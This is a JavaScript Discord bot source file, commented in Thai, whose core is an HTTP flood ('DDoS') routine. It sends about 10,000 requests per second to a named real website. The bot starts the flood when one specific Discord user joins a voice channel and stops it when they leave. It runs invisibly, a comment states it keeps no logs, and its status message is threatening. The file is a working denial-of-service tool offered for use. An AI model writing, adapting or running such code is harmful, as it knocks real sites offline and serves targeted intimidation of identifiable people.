const { Client, GatewayIntentBits } = require("discord.js");
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates,
  ],
});
const config = require("./config");

// ฟังก์ชั่นสำหรับส่ง DDOS attack (**ไม่มีการบันทึก log**)
const https = require("https");
const url = require("url");

const targetUrl = "https://thongpoon.com/"; // เปลี่ยนเป็น URL เป้าหมายของคุณ
const requestsPerSecond = 10000; // จำนวนคำขอต่อวินาที
const requestDuration = 1000 / requestsPerSecond; // ระยะเวลาการส่งคำขอ (มิลลิวินาที)

let ddosInterval; // ตัวแปรสำหรับเก็บ setInterval

function startDDOS() {
  console.log("เริ่มการโจมตี DDoS...");
  ddosInterval = setInterval(sendRequest, requestDuration);
}

function stopDDOS() {
  console.log("หยุดการโจมตี DDoS...");
  clearInterval(ddosInterval);
}

let elapsedTime = 0; // ตัวแปรสำหรับเก็บเวลาที่ผ่านไป

function sendRequest() {
  elapsedTime += requestDuration; // อัปเดตเวลาที่ผ่านไป

  if (elapsedTime > 150000) {
    // ตรวจสอบเวลา
    console.log("หยุดพัก 5 วินาที...");
    setTimeout(startDDOS, 5000); // หยุดพัก 5 วินาที
    clearInterval(ddosInterval); // หยุด setInterval
    elapsedTime = 0; // รีเซ็ตเวลา
  } else {
    const options = url.parse(targetUrl);
    const req = https.request(options, (res) => {
      res.on("data", () => {});
      res.on("end", () => {
        sendRequest();
      });
    });
    req.on("error", (err) => {
      if (err.code === "EMFILE") {
        console.error("Error: getaddrinfo EMFILE thongpoon.com");
        stopDDOS(); // หยุดการโจมตี DDoS
      } else {
        console.error(err);
        sendRequest(); // เริ่มยิงต่อ
      }
    });
    req.end();
  }
}

// ฟังก์ชั่นสำหรับส่ง DM ไปหาผู้ใช้
const dmMessage = "บอทออนไลน์แล้ว!"; // ข้อความ DM
const targetUserID1 = "900631894264254464";
async function sendDM() {
  try {
    const user = await client.users.fetch(targetUserID1);
    await user.send(dmMessage);
    console.log(`ส่ง DM ไปหา ${user.tag} เรียบร้อยแล้ว`);
  } catch (error) {
    console.error(`ส่ง DM ไปหา ${targetUserID1} ล้มเหลว: ${error}`);
  }
}

// ฟังก์ชั่นสำหรับตรวจสอบผู้ใช้เข้า/ออกช่องเสียง
const targetUserID = "1021813660198379550"; // ID ผู้ใช้เป้าหมาย

client.on("voiceStateUpdate", (oldState, newState) => {
  if (newState.member.id === targetUserID) {
    if (newState.channel && !oldState.channel) {
      // ผู้ใช้เข้าร่วมช่องเสียง
      console.log(
        `${newState.member.user.tag} เข้าร่วมช่องเสียง ${newState.channel.name}`,
      );
      startDDOS(); // เริ่ม DDOS เมื่อผู้ใช้เข้าร่วม
    } else if (!newState.channel && oldState.channel) {
      // ผู้ใช้ออกจากช่องเสียง
      console.log(
        `${newState.member.user.tag} ออกจากช่องเสียง ${oldState.channel.name}`,
      );
      stopDDOS(); // หยุด DDOS เมื่อผู้ใช้ออกจากช่องเสียง
    }
  }
});

// การตั้งค่าสถานะ
client.on("ready", async () => {
  console.log(`Logged in as ${client.user.tag}`);

  // ส่ง DM เมื่อบอทออนไลน์
  await sendDM();

  function createOrEditStatusEntry(status, activities) {
    const presence = {
      status: status,
      activities: activities,
    };
    client.user.setPresence(presence);
  }

  createOrEditStatusEntry("invisible", [
    {
      name: "ถ้าจะเล่นไฟ ต้องแน่ใจว่าตัวเองไม่กลัวควัน",
      type: "PLAYING",
    },
  ]);
});

client.login(config.TOKEN);
